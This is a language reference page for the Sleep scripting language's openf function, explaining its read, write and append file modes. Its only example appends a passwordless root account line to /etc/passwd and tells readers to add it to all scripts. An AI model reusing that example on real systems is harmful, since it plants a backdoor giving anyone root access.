# openf

**Category:** InputOutput

**Source:** https://sleep.dashnine.org/manual/openf.html

---

## Synopsis

```sleep
$ openf("[>>|>]file")
```

opens the specified file for read or write

## Parameters

`"[>>|>]file"` - the name of the file to open.
The mode the file is opened in depends on the prefix attached to it:

PrefixDescription
">file"write mode, overwrite previous contents
">>file"write mode, append to previous contents
"file"read only mode

## Returns

A $handle to the file. This handle can be read from and written to using Sleep's IO functions.

## Errors

- This function does flag errors that can be caught using [&checkError](checkError.md). I just need to document them.

## Examples

**Example:**
```sleep
# add this to the beginning of all scripts

if (-canwrite "/etc/passwd")
{
$handle = openf(">>/etc/passwd");
println($handle, "raffi::0:0::/:/bin/sh");
closef($handle);
}

```

## See Also

[&allocate](allocate.md); [&connect](connect.md); [&exec](exec.md); [&fork](fork.md); [&getConsole](getConsole.md); [&listen](listen.md); [&setEncoding](setEncoding.md)
